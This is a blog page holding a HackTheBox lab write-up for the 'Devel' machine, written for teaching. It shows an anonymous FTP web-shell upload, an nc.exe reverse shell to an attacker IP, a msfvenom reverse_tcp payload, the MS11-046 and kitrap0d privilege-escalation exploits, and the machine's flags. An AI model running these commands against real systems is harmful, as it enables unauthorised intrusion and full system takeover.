@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Devel Writeup/Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This writeup is based on Devel HackTheBox which is an easy-rated Windows machine. It having File Upload and Windows Kernel Vulnerability.">
+    <link rel="canonical" href="https://sheerazali.com/blog/devel-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Devel Writeup/Walkthrough Hack the box">
+    <meta property="og:description" content="This writeup is based on Devel HackTheBox which is an easy-rated Windows machine. It having File Upload and Windows Kernel Vulnerability.">
+    <meta property="og:url" content="https://sheerazali.com/blog/devel-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-06-04T05:52:36.000Z">
+    <meta property="article:modified_time" content="2021-06-04T08:18:11.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Devel Writeup/Walkthrough Hack the box">
+    <meta name="twitter:description" content="This writeup is based on Devel HackTheBox which is an easy-rated Windows machine. It having File Upload and Windows Kernel Vulnerability.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/devel-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Devel Writeup/Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/devel-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2021-06-04T05:52:36.000Z",
+    "dateModified": "2021-06-04T08:18:11.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This writeup is based on Devel HackTheBox which is an easy-rated Windows machine. It having File Upload and Windows Kernel Vulnerability.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/devel-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">June 04, 2021</span>
+        <span class="reading-time">10 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Devel Writeup/Walkthrough Hack the box">Devel Writeup/Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2021/06/Copy-of-BLOG-THUMBNAILS.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="Devel Writeup/Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Devel Writeup/Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="devel-writeup-summary">Devel Writeup Summary</h2><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_Devel_Cover.png" class="kg-image" alt loading="lazy" width="770" height="424"></figure><h2 id="tldr">TL;DR</h2><p>This writeup is based on <a href="//www.hackthebox.eu/home/machines/profile/3">Devel</a> which is an easy-rated machine on HackTheBox. It starts with FTP and HTTP. I will use FTP anonymous login to upload a webshell to get shell on the machine. Later on, I’ll use one of many Windows kernel exploit to gain system shell. It requires some basic privilege escalation for the root flag.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I will start with Nmap scan to find the open ports and services active on machine. I found FTP and HTTP open on 21 and 80 respectively. By using Banner Grabbing, we will able to get the version of FTP and HTTP. Let’s see the nmap result.</p><pre><code class="language-bash">nmap -sC -sV -oA intense 10.129.152.23
+ Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 19:04 UTC
+ Nmap scan report for 10.129.152.23
+ Host is up (0.069s latency).
+ Not shown: 998 filtered ports
+ PORT   STATE SERVICE VERSION
+ 21/tcp open  ftp     Microsoft ftpd
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | 03-18-17  02:06AM                aspnet_client
+ | 03-17-17  05:37PM                689 iisstart.htm
+ |03-17-17  05:37PM                 184946 welcome.png | ftp-syst:  |  SYST: Windows_NT
+ 80/tcp open  http    Microsoft IIS httpd 7.5
+ | http-methods: 
+ |_  Potentially risky methods: TRACE
+ |_http-server-header: Microsoft-IIS/7.5
+ |_http-title: IIS7
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds</code></pre><p>As we found the version of FTP and HTTP. First, we will enumerate HTTP. Let’s jump into it in enumeration phase.</p><h2 id="enumeration">Enumeration</h2><p>Let’s see the IP on the browser.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_http-cover.png" class="kg-image" alt loading="lazy" width="688" height="396"><figcaption>Web Page</figcaption></figure><p>The above image reveals that the website is running on IIS 7 Server. We have an option to do directory brute-force but I want to skip this process because we didn’t have anything interesting on the website. But we can see the source of the website.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_source-http-1.png" class="kg-image" alt loading="lazy" width="698" height="404"></figure><p>We can see that the image on the website is having the source <strong>“welcome.png”</strong>. Now, we have only this much information for HTTP. Let’s move to enumeration of FTP.</p><p>We will login to FTP via anonymous user.</p><pre><code class="language-bash">ftp 10.129.152.23
+Connected to 10.129.152.23.
+220 Microsoft FTP Service
+Name (10.129.118.104:root): Anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM                     aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+ 226 Transfer complete
+</code></pre><p>In the FTP login, we are able to see some uploaded file and it includes the <strong>“welcome.png”</strong> which correlates us to the source which we saw on the source of the website. So now, let’s check <strong>welcome.png</strong> on the website.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_welcome-80.png" class="kg-image" alt loading="lazy" width="770" height="440"><figcaption>10.129.152.23/welcome.png</figcaption></figure><p>We can see the <strong>“welcome.png”</strong> on the website which is uploaded on the machine via ftp. It indicates that we can able to upload files to trigger RCE (Remote Code Execution) on the machine. Remote Code Execution is a vulnerability when an attacker puts some input to a file and executes it. It leads to full compromise of  target machine.</p><p>We can upload a test file to the machine to check whether we can able to upload any file or not.</p><pre><code class="language-bash"> ftp 10.129.152.23
+ Connected to 10.129.152.23.
+ 220 Microsoft FTP Service
+ Name (10.129.152.23:root): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp&gt; put testh4x.txt 
+ local: testh4x.txt remote: testh4x.txt
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 32 bytes sent in 0.00 secs (1.0523 MB/s)</code></pre><h2 id="devel-writeup-exploitation-without-metasploit">Devel Writeup Exploitation (Without Metasploit)</h2><h3 id="ftp-exploitation-file-upload">FTP Exploitation (File Upload)</h3><p>We successfully uploaded our test file to the machine.<strong> </strong>Now, we can upload a simple web shell to the machine. If you search for web shells on Google, you will get tons of shells. I like to use web shell from  <a href="//github.com/danielmiessler/SecLists">SecLists</a>. Later on we will visit to &lt;ip address&gt;/cmd.aspx.</p><pre><code class="language-bash"> ftp 10.129.152.23
+ Connected to 10.129.152.23.
+ 220 Microsoft FTP Service
+ Name (10.129.152.23:root): anonymous
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp&gt; put cmd.aspx 
+ local: cmd.aspx remote: cmd.aspx
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 1442 bytes sent in 0.00 secs (31.2545 MB/s)</code></pre><p>Now I will visit http://10.129.152.23/cmd.aspx. and I get a form.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_cmd-shell.png" class="kg-image" alt loading="lazy" width="740" height="169"><figcaption>cmd.aspx</figcaption></figure><p>Now we can run <strong>whoami</strong> to print the current user of machine.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_cmd-whoami.png" class="kg-image" alt loading="lazy" width="756" height="194"><figcaption>whoami</figcaption></figure><p>As also we can run <strong>dir</strong> to see the files, we get to know the directory path of the target machine.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_cmd-dir.png" class="kg-image" alt loading="lazy" width="638" height="449"><figcaption>dir</figcaption></figure><p>As we can see that the user is <strong>iis appool\web</strong>, we have some ways to get shell by using <strong>nc.exe</strong>, <strong><a href="//github.com/samratashok/nishang">Nishang</a></strong> and Meterpreter. I will use nc.exe to get the shell.</p><p>I’ll make a directory name <strong>h4xploit</strong> and copy nc.exe in the directory. I will run now smb server.</p><pre><code class="language-bash">sudo python smbserver.py share h4xploit/
+ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+ [] Config file parsed 
+ [] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+ [] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+ [] Config file parsed
+ [] Config file parsed 
+ [] Config file parsed</code></pre><p>Now, I will launch <strong>nc</strong> listener on my local box to get the shell.</p><pre><code class="language-bash"> nc -lnvp 443
+ Listening on 0.0.0.0 443</code></pre><p>Now, I will give command to the webshell.</p><pre><code class="language-bash">\\10.10.14.61\share\nc.exe -e cmd.exe 10.10.14.61 443 </code></pre><p>By this above command, we get the shell.</p><pre><code class="language-bash"> Connection received on 10.129.152.23 49159
+ Microsoft Windows [Version 6.1.7600]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+ c:\windows\system32\inetsrv&gt;whoami
+ iis apppool\web
+ c:\windows\system32\inetsrv&gt; cd ../../..
+ c:\ cd Users
+ c:\Users&gt;cd babis 
+ cd babis
+ Access is denied.
+ c:\Users&gt;</code></pre><p>As you can see we have access denied to the users. So we have to get the system shell.</p><p>Now, we have to use exploit suggestor as WinPEAS, Watson or msfconsole’s local-exploit-suggestor.  I will be using watson to see the suggested exploits.</p><h3 id="privilege-escalation-using-watson">Privilege Escalation (Using Watson)</h3><p>I already transferred the Watson.exe to the target system using smbserver. If you want to download Watson.exe, then visit <a href="//github.com/rasta-mouse/Watson">Watson</a> .</p><p>Now, let’s run the watson.exe and see the suggested exploits for privilege escalation.</p><pre><code class="language-bash">c:\Windows\Microsoft.NET\Framework&gt;\10.10.14.61\share\Watson.exe
+\\10.10.14.61\share\Watson.exe
+  
+[] OS Build number: 7600 
+[] CPU Address Width: 32 
+[] Process IntPtr Size: 4 
+[] Using Windows path: C:\WINDOWS\System32
+
+[] Appears vulnerable to MS10-073
+ [&gt;] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel. 
+[&gt;] Exploit: https://www.exploit-db.com/exploits/36327/ 
+[&gt;] Notes: None. 
+
+[] Appears vulnerable to MS10-092 
+[&gt;] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
+[&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
+[&gt;] Notes: None. 
+
+[] Appears vulnerable to MS11-046
+ [&gt;] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges. 
+[&gt;] Exploit: https://www.exploit-db.com/exploits/40564/ 
+[&gt;] Notes: None.
+
+[] Appears vulnerable to MS12-042 
+[&gt;] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode. 
+[&gt;] Exploit: https://www.exploit-db.com/exploits/20861/ 
+[&gt;] Notes: None. 
+
+[] Appears vulnerable to MS13-005 
+[&gt;] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. 
+[&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb 
+[&gt;] Notes: None. 
+
+[] Finished. Found 5 vulns :)
+</code></pre><p>As you can see the suggested exploits above using Watson.exe. Now, I’ll choose <a href="//github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046">MS11-046</a> because I found it compatible with our requirements and easily available on <a href="//github.com/abatchy17/WindowsExploits">WindowsExploits</a>. If you see the source of the exploit it shows:</p><pre><code class="language-bash"> Privileged shell execution:  
+     - the SYSTEM shell will spawn within the invoking shell/process</code></pre><p>For getting system shell, we have <a href="//github.com/abatchy17/WindowsExploits/tree/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046">MS11-046</a>,  this is a precompiled exe that spawn system shell within current shell. I will save this exe in my smb share and run it on the current shell.  If you want to know more about MS11-046, then you can visit <a href="//docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046">here</a> .</p><pre><code class="language-bash">c:\Users&gt;\\10.10.14.61\share\MS11-046.exe
+ 
+ c:\Windows\System32&gt;whoami
+ whoami
+ nt authority\system
+ c:\Windows\System32&gt;</code></pre><h2 id="devel-writeup-exploitation-with-metasploit">Devel Writeup Exploitation (With Metasploit)</h2><p>We have to create a payload using msfvenom to upload in the machine using <strong>ftp</strong>.</p><pre><code class="language-bash"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.61 LPORT=4444 -f aspx &gt; h4xplo1t.aspx
+ [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+ [-] No arch selected, selecting arch: x86 from the payload
+ No encoder specified, outputting raw payload
+ Payload size: 354 bytes
+ Final size of aspx file: 2884 bytes</code></pre><p>As I created the payload. Now, I will upload this file to the machine.</p><pre><code class="language-bash"> ftp 10.129.152.23
+ Connected to 10.129.152.23.
+ 220 Microsoft FTP Service
+ Name (10.129.152.23:root): anonymous
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp&gt; put h4xplo1t.aspx 
+ local: h4xplo1t.aspx remote: h4xplo1t.aspx
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 2921 bytes sent in 0.00 secs (30.9520 MB/s)</code></pre><p>Now, I will visit http://10.129.152.23/h4xplo1t.aspx. Until we can setup the meterpreter for getting shell.</p><pre><code class="language-bash"> msf6 &gt; use exploit/multi/handler 
+ msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+ payload =&gt; windows/meterpreter/reverse_tcp
+ msf6 exploit(multi/handler) &gt; show options
+ Module options (exploit/multi/handler):
+ Name  Current Setting  Required  Description
+ ----  ---------------  --------  -----------
+ Payload options (windows/meterpreter/reverse_tcp):
+ Name      Current Setting  Required  Description
+ ----      ---------------  --------  -----------
+ EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+ LHOST                      yes       The listen address (an interface may be specified)
+ LPORT     4444             yes       The listen port
+ Exploit target:
+ Id  Name
+ --  ----
+ 0   Wildcard Target
+ msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.61
+ LHOST =&gt; 10.10.14.61
+ msf6 exploit(multi/handler) &gt; run
+ [*] Started reverse TCP handler on 10.10.14.61:4444</code></pre><p>After visiting to http://10.129.152.23/h4xplo1t.aspx. I get the shell in metasploit.</p><pre><code class="language-bash"> [*] Meterpreter session 1 opened (10.10.14.61:4444 -&gt; 10.129.152.23:49164) at 2021-05-28 12:41:14 +0000
+ meterpreter &gt; sysinfo
+ Computer        : DEVEL
+ OS              : Windows 7 (6.1 Build 7600).
+ Architecture    : x86
+ System Language : el_GR
+ Domain          : HTB
+ Logged On Users : 0
+ Meterpreter     : x86/windows</code></pre><p>Now, I’ll use local_exploit_suggestor for identifying exploits to get system shell. I will select the backgrounded session to identify the exploit.</p><pre><code class="language-bash"> msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1
+ SESSION =&gt; 1
+ msf6 post(multi/recon/local_exploit_suggester) &gt; run
+ [] 10.129.152.23 - Collecting local exploits for x86/windows… [] 10.129.152.23 - 37 exploit checks are being tried…
+ [+] 10.129.152.23 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+ [+] 10.129.152.23 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+ [+] 10.129.152.23 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+ [+] 10.129.152.23 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+ [+] 10.129.152.23 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+ [+] 10.129.152.23 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+ [*] Post module execution completed </code></pre><p>I will use exploit/windows/local/ms10_015_kitrap0d, this exploit gives new session with system shell.</p><pre><code class="language-bash"> msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 2
+ SESSION =&gt; 2
+ msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LHOST 10.10.14.61
+ LHOST =&gt; 10.10.14.61
+ msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run
+ [] Started reverse TCP handler on 10.10.14.61:4444  [] Launching notepad to host the exploit…
+ [+] Process 3204 launched.
+ [] Reflectively injecting the exploit DLL into 3204… [] Injecting exploit into 3204 …
+ [] Exploit injected. Injecting payload into 3204… [] Payload injected. Executing exploit…
+ [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+ [] Sending stage (175174 bytes) to 10.129.152.23 [] Meterpreter session 3 opened (10.10.14.61:4444 -&gt;    
+ 10.129.152.23:49165) at 2021-05-28 12:51:59 +0000
+ meterpreter &gt; shell
+ Process 3484 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.1.7600]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+ c:\windows\system32\inetsrv&gt;whoami
+ whoami
+ nt authority\system
+ c:\windows\system32\inetsrv&gt;</code></pre><p>As we saw in the manual exploitation part, before privilege escalation, we don’t have access to the user as well as to root flag. Once we escalated the privileges, we have access to user.txt and root.txt</p><h2 id="devel-writeup-user">Devel Writeup: User</h2><p>We get the user babis. We get the user flag.</p><pre><code class="language-bash"> c:&gt;cd Users/babis/Desktop
+ c:\Users\babis\Desktop&gt;type user.txt.txt
+ 9ecdd6a3aedf24b41562fea70f4cb3e8
+ c:\Users\babis\Desktop&gt;</code></pre><h2 id="devel-writeup-root">Devel Writeup: Root</h2><p>We can now read the root flag.</p><pre><code class="language-bash"> c:\Users&gt;cd Administrator/Desktop 
+ c:\Users\Administrator\Desktop&gt;type root.txt 
+ e621a0b5041708797c4fc4728bc72b4b 
+ c:\Users\Administrator\Desktop&gt;</code></pre><p>Hope you like the writeup. You can also checkout my recent writeups <a href="https://sheerazali.com/lame-writeup-walkthrough-hack-the-box/">Lame</a> and <a href="https://sheerazali.com/legacy-writeup-walkthrough-hack-the-box/">Legacy</a> .</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
